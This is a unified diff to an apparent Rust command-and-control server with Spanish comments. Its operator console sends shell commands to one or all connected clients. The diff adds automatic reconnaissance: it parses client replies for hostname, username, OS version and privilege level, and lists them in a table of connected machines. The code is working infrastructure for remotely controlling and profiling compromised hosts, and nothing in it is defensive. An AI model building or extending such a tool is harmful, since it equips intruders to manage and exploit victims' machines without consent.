@@ -6,6 +6,7 @@ use std::sync::{Arc, Mutex};
 use std::sync::atomic::{AtomicU64, Ordering};
 use std::io::{self, BufRead, Write};
 use clap::Parser;
+use chrono::Local;
 
 type ClientId = u64;
 
@@ -28,16 +29,42 @@ struct Args {
     verbose: bool,
 }
 
+// Información del cliente
+#[derive(Clone)]
+struct ClientInfo {
+    id: ClientId,
+    addr: String,
+    hostname: Option<String>,
+    username: Option<String>,
+    os_version: Option<String>,
+    privileges: Option<String>,
+    connected_at: String,
+}
+
+impl ClientInfo {
+    fn new(id: ClientId, addr: String) -> Self {
+        Self {
+            id,
+            addr,
+            hostname: None,
+            username: None,
+            os_version: None,
+            privileges: None,
+            connected_at: Local::now().format("%Y-%m-%d %H:%M:%S").to_string(),
+        }
+    }
+}
+
 // Estructura para manejar cada cliente
 struct ClientHandle {
     id: ClientId,
-    addr: String,
+    info: Arc<Mutex<ClientInfo>>,
     tx: mpsc::UnboundedSender<String>,
 }
 
 // Maneja la comunicación con un cliente
 async fn handle_client(
-    id: ClientId, 
+    id: ClientId,
     stream: TcpStream,
     clients: Arc<Mutex<HashMap<ClientId, ClientHandle>>>,
     verbose: bool,
@@ -46,12 +73,13 @@ async fn handle_client(
     println!("🔗 Nuevo cliente [{}] desde {}", id, addr);
 
     let (tx, mut rx) = mpsc::unbounded_channel::<String>();
+    let client_info = Arc::new(Mutex::new(ClientInfo::new(id, addr.clone())));
     
     {
         let mut clients = clients.lock().unwrap();
         clients.insert(id, ClientHandle {
             id,
-            addr: addr.clone(),
+            info: client_info.clone(),
             tx,
         });
     }
@@ -101,8 +129,10 @@ async fn handle_client(
     });
 
     // Tarea para recibir respuestas del cliente
+    let info = client_info.clone();
     let recv_task = tokio::spawn(async move {
         let mut buffer = String::new();
+        let mut last_command = String::new();
         
         loop {
             buffer.clear();
@@ -135,8 +165,40 @@ async fn handle_client(
             // Remover delimitador y mostrar respuesta
             let response = buffer.replace(DELIMITER, "").trim().to_string();
             
-            // No mostrar respuestas de pong (keep-alive)
-            if !response.is_empty() && response != "pong" {
+            // Detectar respuestas de recon automático
+            if response.starts_with("__SYSINFO__") {
+                let parts: Vec<&str> = response.split("::").collect();
+                if parts.len() >= 2 {
+                    let mut info = info.lock().unwrap();
+                    match parts[0] {
+                        "__SYSINFO__HOSTNAME" => {
+                            info.hostname = Some(parts[1].to_string());
+                            if verbose {
+                                println!("📝 Cliente [{}] hostname: {}", id, parts[1]);
+                            }
+                        }
+                        "__SYSINFO__USERNAME" => {
+                            info.username = Some(parts[1].to_string());
+                            if verbose {
+                                println!("📝 Cliente [{}] username: {}", id, parts[1]);
+                            }
+                        }
+                        "__SYSINFO__OS" => {
+                            info.os_version = Some(parts[1].to_string());
+                            if verbose {
+                                println!("📝 Cliente [{}] OS: {}", id, parts[1]);
+                            }
+                        }
+                        "__SYSINFO__PRIV" => {
+                            info.privileges = Some(parts[1].to_string());
+                            if verbose {
+                                println!("📝 Cliente [{}] privileges: {}", id, parts[1]);
+                            }
+                        }
+                        _ => {}
+                    }
+                }
+            } else if !response.is_empty() && response != "pong" {
                 println!("\n📨 Respuesta del cliente [{}]:\n{}\n", id, response);
                 print!("> ");
                 let _ = io::stdout().flush();
@@ -214,7 +276,7 @@ async fn main() {
             match parts[0] {
                 "/help" => {
                     println!("📖 Comandos disponibles:");
-                    println!("  /list                    -> lista clientes conectados");
+                    println!("  /list                    -> lista clientes conectados con info");
                     println!("  /select <id>             -> selecciona un cliente por ID");
                     println!("  /cmd <comando>           -> envía comando al cliente seleccionado");
                     println!("  /cmd_all <comando>       -> envía comando a todos los clientes");
@@ -226,12 +288,25 @@ async fn main() {
                     if clients.is_empty() {
                         println!("  No hay clientes conectados");
                     } else {
-                        println!("📋 Clientes conectados:");
-                        println!("{:<5} {:<25}", "ID", "Dirección");
-                        println!("{}", "-".repeat(35));
+                        println!("\n📋 Clientes conectados:");
+                        println!("{}", "=".repeat(130));
+                        println!("{:<4} {:<22} {:<18} {:<18} {:<25} {:<12} {:<20}", 
+                            "ID", "Dirección", "Hostname", "Usuario", "OS", "Privilegios", "Conectado");
+                        println!("{}", "-".repeat(130));
+                        
                         for (id, client) in clients.iter() {
-                            println!("{:<5} {:<25}", id, client.addr);
+                            let info = client.info.lock().unwrap();
+                            println!("{:<4} {:<22} {:<18} {:<18} {:<25} {:<12} {:<20}",
+                                id,
+                                info.addr,
+                                info.hostname.as_deref().unwrap_or("Recopilando..."),
+                                info.username.as_deref().unwrap_or("Recopilando..."),
+                                info.os_version.as_deref().unwrap_or("Recopilando..."),
+                                info.privileges.as_deref().unwrap_or("Recopilando..."),
+                                info.connected_at
+                            );
                         }
+                        println!("{}", "=".repeat(130));
                     }
                 }
                 "/select" => {
